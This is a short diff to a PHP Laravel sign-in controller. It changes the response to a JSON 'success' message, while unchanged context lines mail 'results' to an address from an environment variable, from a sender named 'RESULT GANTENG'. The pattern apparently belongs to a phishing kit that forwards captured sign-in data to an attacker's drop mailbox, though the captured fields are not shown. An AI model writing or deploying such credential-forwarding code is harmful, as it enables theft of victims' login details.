@@ -22,9 +22,7 @@ class SignInController extends Controller
           $mail->to(env("RESULT_EMAIl"));
           $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
         });
-        
-        if(Request::type('ajax')) {
-        return Response::json(['data' => ['redirect'   => '/']]);
-        }
+
+      return response()->json(array('msg', 'success'),200);
     }
 }
